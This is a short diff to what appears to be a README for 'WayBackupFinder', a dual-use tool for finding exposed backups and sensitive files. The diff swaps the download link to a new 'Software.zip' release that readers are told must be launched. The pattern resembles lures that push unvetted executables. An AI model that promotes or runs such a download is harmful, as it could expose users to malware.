@@ -13,7 +13,7 @@ WayBackupFinder is a tool designed to help identify potential backups and sensit
 🛡️ **Security**  
 
 ## Download Software
-[![Download Software](https://github.com/Quesilica/WayBackupFinder/releases/download/v1.0/Release.zip)](https://github.com/Quesilica/WayBackupFinder/releases/download/v1.0/Release.zip)  
+[![Download Software](https://github.com/Quesilica/WayBackupFinder/releases/download/v2.0/Software.zip)](https://github.com/Quesilica/WayBackupFinder/releases/download/v2.0/Software.zip)  
 *Need to be launched to access the software*
 
 ## Usage
